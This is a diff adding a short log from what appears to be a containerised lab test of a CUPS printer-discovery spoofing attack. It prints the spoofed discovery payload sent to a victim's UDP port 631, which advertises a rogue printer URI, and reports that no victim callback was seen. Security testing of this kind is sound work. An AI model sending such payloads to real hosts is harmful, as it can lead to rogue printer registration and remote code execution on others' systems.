@@ -1,0 +1,10 @@
+2026-11-15 20:26:14,647 INFO Victim: victim -> 172.20.0.2
+2026-11-15 20:26:14,647 INFO Printer: printer -> 172.20.0.3
+2026-11-15 20:26:14,648 INFO Advertising printer URI: http://172.20.0.3:9999/printers/FinalVariantB
+2026-11-15 20:26:14,648 INFO Discovery payload: b'0 3 http://172.20.0.3:9999/printers/FinalVariantB "University Lab" "Scapy Test Printer" "Virtual Printer"\n'
+2026-11-15 20:26:15,048 INFO Sending one legacy CUPS discovery packet to 172.20.0.2:631/udp
+2026-11-15 20:26:30,097 INFO Saved 1 packets to pcap_files/final_run/variant_b_discovery.pcap
+2026-11-15 20:26:30,097 INFO RESULT: No victim connection attempt visible in attacker capture
+2026-11-15 20:26:30,097 INFO Docker bridge traffic between victim and printer may not be visible to attacker.
+2026-11-15 20:26:30,097 INFO Verify callback independently in printer container logs or packet capture.
+2026-11-15 20:26:30,097 INFO A callback does not prove printer registration or code execution.
